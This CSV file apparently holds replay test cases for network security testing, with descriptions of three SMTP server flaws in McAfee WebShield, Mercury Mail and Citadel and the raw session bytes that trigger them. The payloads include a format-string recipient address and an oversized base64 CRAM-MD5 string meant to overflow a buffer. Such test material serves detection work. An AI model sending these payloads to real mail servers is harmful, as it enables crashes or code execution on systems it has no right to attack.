XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20060403-15_McAfee_WebShield_SMTP_Bounce_Message_Format_String_Vulnerability.xml,McAfee WebShield SMTP Bounce Message Format String Vulnerability,"There exists a format string vulnerability in the SMTP virus scanning software, McAfee WebShield SMTP. The vulnerability is caused due to improper sanitation of non-existent domain names when generating a bounce message. An unauthenticated attacker may leverage the vulnerability to inject and execute arbitrary code in the context of the running service, normally System.",SMTP,TCP,"HELO fscslawek||0D 0A ||MAIL FROM||3A || <test@from.com>||0D 0A ||RCPT TO||3A || <aaaaaaaaaaa@aaaaa%s%s%n%n%n%s%s.com>||0D 0A ||DATA||0D 0A ||Message-ID||3A || <008b01c6655e$a25ccdc0$4601020a@fscslawek>||0D 0A ||From||3A || ||22 ||slawek warelis||22 || <test@from.com>||0D 0A ||To||3A || <aaaaaaaaaaa@aaaaa%s%s%n%n%n%s%s.com>||0D 0A ||Subject||3A || testing||0D 0A ||Date||3A || Fri, 21 Apr 2006 12||3A ||14||3A ||15 -0400||0D 0A ||MIME-Version||3A || 1.0||0D 0A ||Content-Type||3A || multipart/alternative||3B 0D 0A 09 ||boundary=||22 ||----=_NextPart_000_0088_01C6653D.1B3CFCF0||22 0D 0A ||X-Priority||3A || 3||0D 0A ||X-MSMail-Priority||3A || Normal||0D 0A ||X-Mailer||3A || Microsoft Outlook Express 6.00.2900.2180||0D 0A ||X-MimeOLE||3A || Produced By Microsoft MimeOLE V6.00.2900.2180||0D 0A 0D 0A ||This is a multi-part message in MIME format.||0D 0A 0D 0A ||------=_NextPart_000_0088_01C6653D.1B3CFCF0||0D 0A ||Content-Type||3A || text/plain||3B 0D 0A 09 ||charset=||22 ||iso-8859-1||22 0D 0A ||Content-Transfer-Encoding||3A || quoted-printable||0D 0A 0D 0A ||hello||0D 0A ||------=_NextPart_000_0088_01C6653D.1B3CFCF0||0D 0A ||Content-Type||3A || text/html||3B 0D 0A 09 ||charset=||22 ||iso-8859-1||22 0D 0A ||Content-Transfer-Encoding||3A || quoted-printable||0D 0A 0D 0A ||<!DOCTYPE HTML PUBLIC ||22 ||-//W3C//DTD HTML 4.0 Transitional//EN||22 ||>||0D 0A ||<HTML><HEAD>||0D 0A ||<META http-equiv=3DContent-Type content=3D||22 ||text/html||3B || =||0D 0A ||charset=3Diso-8859-1||22 ||>||0D 0A ||<META content=3D||22 ||MSHTML 6.00.2900.2802||22 || name=3DGENERATOR>||0D 0A ||<STYLE></STYLE>||0D 0A ||</HEAD>||0D 0A ||<BODY bgColor=3D#ffffff>||0D 0A ||<DIV><FONT face=3DArial size=3D2>hello</FONT></DIV></BODY></HTML>||0D 0A 0D 0A ||------=_NextPart_000_0088_01C6653D.1B3CFCF0--||0D 0A 0D 0A ||.||0D 0A ||QUIT||0D 0A||"
FSC20060403-15_McAfee_WebShield_SMTP_Bounce_Message_Format_String_Vulnerability.xml,McAfee WebShield SMTP Bounce Message Format String Vulnerability,"There exists a format string vulnerability in the SMTP virus scanning software, McAfee WebShield SMTP. The vulnerability is caused due to improper sanitation of non-existent domain names when generating a bounce message. An unauthenticated attacker may leverage the vulnerability to inject and execute arbitrary code in the context of the running service, normally System.",SMTP,TCP,"220 win2ksrv WebShield SMTP V4.5 MR1a Network Associates, Inc. Ready at Fri Apr 21 12||3A ||14||3A ||14 2006||0D 0A||"
﻿FSC20070820-02_Mercury_Mail_Transport_System_SMTP_AUTH_CRAM-MD5_Buffer_Overflow.xml,Mercury Mail Transport System SMTP AUTH CRAM-MD5 Buffer Overflow,There exists a stack buffer overflow in Mercury Mail Transport System. The vulnerability is due to a boundary error when processing CRAM-MD5 string following the SMTP AUTH command. Successful exploitation of this vulnerability allows remote attackers to create denial of service condition or execute arbitrary code with the privileges of the affected application.,HTTP,TCP,EHLO foo.com||0D 0A||
FSC20070820-02_Mercury_Mail_Transport_System_SMTP_AUTH_CRAM-MD5_Buffer_Overflow.xml,Mercury Mail Transport System SMTP AUTH CRAM-MD5 Buffer Overflow,There exists a stack buffer overflow in Mercury Mail Transport System. The vulnerability is due to a boundary error when processing CRAM-MD5 string following the SMTP AUTH command. Successful exploitation of this vulnerability allows remote attackers to create denial of service condition or execute arbitrary code with the privileges of the affected application.,HTTP,TCP,AUTH CRAM-MD5||0D 0A||
FSC20070820-02_Mercury_Mail_Transport_System_SMTP_AUTH_CRAM-MD5_Buffer_Overflow.xml,Mercury Mail Transport System SMTP AUTH CRAM-MD5 Buffer Overflow,There exists a stack buffer overflow in Mercury Mail Transport System. The vulnerability is due to a boundary error when processing CRAM-MD5 string following the SMTP AUTH command. Successful exploitation of this vulnerability allows remote attackers to create denial of service condition or execute arbitrary code with the privileges of the affected application.,HTTP,TCP,YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFh||0D 0A||
FSC20070820-02_Mercury_Mail_Transport_System_SMTP_AUTH_CRAM-MD5_Buffer_Overflow.xml,Mercury Mail Transport System SMTP AUTH CRAM-MD5 Buffer Overflow,There exists a stack buffer overflow in Mercury Mail Transport System. The vulnerability is due to a boundary error when processing CRAM-MD5 string following the SMTP AUTH command. Successful exploitation of this vulnerability allows remote attackers to create denial of service condition or execute arbitrary code with the privileges of the affected application.,HTTP,TCP,||00 00 00 00 00 00||
FSC20070820-02_Mercury_Mail_Transport_System_SMTP_AUTH_CRAM-MD5_Buffer_Overflow.xml,Mercury Mail Transport System SMTP AUTH CRAM-MD5 Buffer Overflow,There exists a stack buffer overflow in Mercury Mail Transport System. The vulnerability is due to a boundary error when processing CRAM-MD5 string following the SMTP AUTH command. Successful exploitation of this vulnerability allows remote attackers to create denial of service condition or execute arbitrary code with the privileges of the affected application.,HTTP,TCP,220 172.16.8.204 ESMTP server ready.||0D 0A ||250-172.16.8.204 Hello foo.com||3B || ESMTPs are||3A 0D 0A ||250-TIME||0D 0A ||250-SIZE 0||0D 0A ||250 HELP||0D 0A||
FSC20070820-02_Mercury_Mail_Transport_System_SMTP_AUTH_CRAM-MD5_Buffer_Overflow.xml,Mercury Mail Transport System SMTP AUTH CRAM-MD5 Buffer Overflow,There exists a stack buffer overflow in Mercury Mail Transport System. The vulnerability is due to a boundary error when processing CRAM-MD5 string following the SMTP AUTH command. Successful exploitation of this vulnerability allows remote attackers to create denial of service condition or execute arbitrary code with the privileges of the affected application.,HTTP,TCP,334 PDc2MzExMjUuMzQ2QDE3Mi4xNi44LjIwND4=||0D 0A||
FSC20070820-02_Mercury_Mail_Transport_System_SMTP_AUTH_CRAM-MD5_Buffer_Overflow.xml,Mercury Mail Transport System SMTP AUTH CRAM-MD5 Buffer Overflow,There exists a stack buffer overflow in Mercury Mail Transport System. The vulnerability is due to a boundary error when processing CRAM-MD5 string following the SMTP AUTH command. Successful exploitation of this vulnerability allows remote attackers to create denial of service condition or execute arbitrary code with the privileges of the affected application.,HTTP,TCP,501 Error in AUTH response format.||0D 0A||
﻿FSC20080122-06_Citadel_SMTP_RCPT_TO_Remote_Buffer_Overflow.xml,Citadel SMTP RCPT TO Remote Buffer Overflow,There exists a buffer overflow vulnerability in Citadel SMTP Server. The vulnerability is due to insufficient boundary check when processing user provided data. Remote attackers could exploit this vulnerability by supplying a specially crafted RCPT TO command to the server. Successful exploitation of this vulnerability allows remote attackers execute arbitrary code with the privileges of the affected application.,,TCP,HELO||0D 0A||
